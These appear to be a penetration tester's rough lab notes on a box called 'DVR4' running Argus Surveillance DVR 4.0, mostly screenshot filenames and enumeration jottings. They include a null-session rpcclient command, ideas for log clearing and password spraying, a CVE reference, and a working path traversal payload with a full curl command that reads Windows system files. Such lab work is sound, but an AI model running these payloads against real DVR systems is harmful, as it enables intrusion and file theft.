# DVR4 Notes

## Data 

IP: 192.168.181.179
OS: Windows 10.0 Build 19041 x64 
Arch:
Hostname: domain:DVR4
DNS:
Domain: DVR4
Machine Purpose: 
Services: SMB           
Service Languages: 
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](DVR4-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks completed

cme-basic.png
cme-disabledguest.png

https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
adminuser79fingerproto.png
20001ftp.png


falsepositiveprobably.png

goodrescanchoices.png

filtering.png


```bash
rpcclient -U "" -N $IP
# Authenticated Session
rpcclient -U <username> --password=<password> $ip
```

nozeroauthrpc.png

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsljcHdJN7STx92SFZR/dtzDsO0v1blAoUfqWva1WJD9WXeKe0S9Oeg4L1eXC6ik5O6+lE7SRqz7Qiudrhk9CXxB0tmmX2SpZKMg1l01wmO5QEhpeuhDOb062dCDc1byOkpbBJq93afwVOEiaCOMVVjnwvJ5MFmZQzBcb02rmHKH7+o2BjMukTA8coWhCc2cqyEgPA031zSYCkdzxLlgHJMUlbDDtD0D143rLPZ6CtP5Nbxpbt/2Hj3thq7GQzToNdgCYCEIMg6Gs4xYHLO4lKcOb92wFdEtx+hA7xFxGOldfmEU4f3jyDSFazolJU4TxzewQ/kIi1W4Cj+tarEVTC6sBUAhHZSLAj5nkz7rljJIXiM8hYp6VMcpsqa1dtlwspeiFXL2RizuQgUzabzsQGmZ0Yu501ieYy1i7mIEWzO2UUx3tnCn9YKAh30jYQQvXYB+oUGuQqDIQh1f0Ds/Jd1IkFMJ8EZQ8Iaoa1UVpxupdZ8jtBm3BKT5+sVtJ4jwE=

```

itsthecameraone.png

5040 https://isc.sans.edu/ referenced alot a filler rabbithole

argussruvillance.png

Gimmick no rabbithole, no nuclei...

Pando-pub? seems to used a download by assumptive convention rather than define as   
7680.png
- https://learn.microsoft.com/en-us/windows/deployment/do/waas-delivery-optimization-faq
- https://en.wikipedia.org/wiki/Pando_(application)

findthefunctionnobustergobust.png

SMB freakout on a previous box is probably not an smb issue find! 
(signing:False) (SMBv1:False)

itsrealsoftware.png
it real
dvrisarealsoftware.png

somewhere is a version
findthedvrversion.png

newcameras.png


searchlocalcameras.png


managecameras.png

cameras.png


recordsquerytypes.png


allrecordsplayback.png


noplaybacks.png

Rest use the same search period options
nomotions.png

nofacesfound.png


noconvertperiodsfound.png

theorisingthe OPtionspage.png

fuzzingisbeinglogged.png

weirdnesslocalhostandme.png

- 2/16/2022 6:51:45 AM, HTTP connection from IP address: 192.168.118.14
- 4/20/2022 9:55:41 AM, HTTP connection from IP address: 192.168.118.14



We can clear logs from http://192.168.181.179:8080/AccessLog.html

ViewersLogs
wecanbeanodetoo.png

noalerts.png

lotsofstartedprogramandonewatchdog.png

logginsthewatchdoge.png


clickingheeretoconfigurewatchdoge.png

Spraying passwords is possible as well Dos through configure weird settings a la stuxnet
watchdogpotentialpasswordspray.png


1percentasalways.png

It would be nice if it is path hijacking for the privesc - unquoted as the space my mistake
```
C:\ProgramData\PY_Software\Argus Surveillance DVR\Images\con.html
```


nooldpasswordnoproblem.png

toolsfordvr4.png

toolipaddress.png


4dot0versionHURRAY.png

allweneedisthebigCE.png

**[CVE-2022-25012](https://github.com/s3l33/CVE-2022-25012)** - Argus Surveillance DVR 4.0 - Weak Password Encryption

Path traversal 
```bash
/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

pathtraversal.png

```
curl 'http://192.168.181.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22' -o path-traversal.html
```

activeXprivescmaybethen.png

What files do I want?
- Mine - webshell 
- Passwords
	- configuration files
- Ssh key 
- Fuzz for the sharename hoping it this in `C:\`

- http://192.168.181.179:8080/OptionsRemAcs.html only for camera and go a camera related route
- Tunnel through server to camera http://192.168.181.179:8080/WEBACCOUNT.CGI?RESULTPAGE=OptionsWebAccount.html&WEBACCOUNTID=Administrator&WEBACCOUNTPASSWORD=password&OkBtn=%A0+Ok%A0+